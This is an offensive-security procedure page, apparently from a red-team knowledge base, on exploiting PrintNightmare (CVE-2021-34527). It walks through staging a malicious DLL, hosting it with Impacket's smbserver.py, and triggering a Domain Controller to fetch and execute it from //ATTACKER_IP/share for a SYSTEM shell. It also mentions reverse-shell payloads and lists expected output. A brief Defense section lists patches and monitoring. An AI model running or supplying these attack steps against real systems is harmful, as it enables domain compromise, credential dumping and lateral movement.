---
type: procedure
verified: true
submitted: false
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/From CVE to SYSTEM shell on DC]]'
  - '[[tags/PrintNightmare]]'
commands:
  - '[[commands/start-impacket-smbserver-share]]'
platforms:
  - Linux
tools:
  - '[[tools/Impacket-SmbServer]]'
validated: true
---

# PrintNightmare SMB Server Payload Hosting

## Summary

This procedure sets up a malicious SMB server to host payloads, such as a rogue DLL, for exploiting the PrintNightmare vulnerability (CVE-2021-34527) on Windows Domain Controllers. By hosting the payload over SMB, an attacker can trick the target into loading and executing the malicious code, leading to remote code execution with SYSTEM privileges.

## Description

PrintNightmare exploits flaws in the Windows Print Spooler service, allowing attackers to abuse RPC calls to load arbitrary DLLs from a remote SMB share. This procedure focuses on configuring and starting an SMB server using Impacket's smbserver.py to share a directory containing the exploit payload. Once the server is running, the attacker can reference the share in the PrintNightmare exploit script (e.g., via PrintNightmare.py from Impacket), causing the Domain Controller to authenticate to the attacker's SMB server and download/execute the payload. This is typically used after initial domain access to escalate to SYSTEM on the DC, enabling credential dumping and lateral movement in Active Directory environments. The target must be a vulnerable Windows Server (unpatched for CVE-2021-34527), and the attacker needs network access to the DC on ports 445 (SMB) and 135 (RPC).

## Requirements

1. Impacket suite installed on the attacker's Linux machine (Kali Linux recommended).
2. A pre-built malicious DLL payload for PrintNightmare (e.g., a DLL that spawns a reverse shell upon loading).
3. Network connectivity to the target Domain Controller over SMB (port 445).
4. Domain user credentials or null session access to initiate the exploit.

## Defense

- Apply Microsoft patches for CVE-2021-34527 (KB5004954 or later) to all Windows systems, especially Domain Controllers.
- Disable unnecessary Print Spooler service (spoolsv.exe) on non-printing servers via Group Policy.
- Monitor SMB traffic for anomalous connections from DCs to external/internal shares using tools like Zeek or Windows Event Logs (Event ID 5145 for share access).
- Implement network segmentation to restrict DC outbound SMB traffic and enable SMB signing enforcement.

## Objectives

1. Host a malicious payload on an SMB share accessible to the target Domain Controller.
2. Enable remote code execution via PrintNightmare by serving the payload during DC authentication.
3. Achieve SYSTEM-level access on the DC for further post-exploitation.

## Instructions

### Step 1: Prepare the Payload Directory

**Context**: Create a dedicated directory to hold the malicious DLL payload. This ensures the SMB share only exposes the necessary files for the exploit, minimizing detection risk.

Place your pre-built DLL (e.g., evil.dll) into a temporary directory on the attacker's machine. For example:

```bash
mkdir -p /tmp/smb
cp /path/to/evil.dll /tmp/smb/
```

> This step isolates the payload. Verify the file is present with `ls /tmp/smb/`; you should see the DLL file listed.

### Step 2: Start the SMB Server

**Context**: Launch the Impacket SMB server to share the payload directory. This makes the DLL available over the network for the target DC to pull during the PrintNightmare exploitation.

**Command** ([[commands/start-impacket-smbserver-share]]):
```bash
python3 smbserver.py share /tmp/smb/ -smb2support
```

> The `smbserver.py` script from Impacket creates an SMB share named 'share' backed by `/tmp/smb/`. The `-smb2support` flag enables SMBv2 for compatibility with modern Windows systems. Run this from the Impacket directory (e.g., after `git clone https://github.com/SecureAuthCorp/impacket`). Expected output includes server startup messages like 'Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation' and 'Selected interface 'eth0'', followed by listening on port 445. The server will log authentication attempts from the DC during exploitation.

### Step 3: Verify SMB Accessibility and Integrate with Exploit

**Context**: Test the share and prepare to trigger the download via the PrintNightmare exploit tool.

From another machine or using `smbclient`, test access:

```bash
smbclient //ATTACKER_IP/share -U domain/user%password
```

> Replace ATTACKER_IP with your machine's IP, and use valid domain creds if required. Successful connection shows the share contents, including the DLL. Then, in your PrintNightmare exploit (e.g., `python3 PrintNightmare.py domain/user:password@DC_IP \\ATTACKER_IP\share`), the DC will authenticate to your SMB server, download the DLL, and execute it, granting SYSTEM shell.

Expected output from smbserver.py during exploit: NTLM auth logs and file access like 'SMB\DC$:\Windows\System32\spool\drivers\x64\3\evil.dll'.
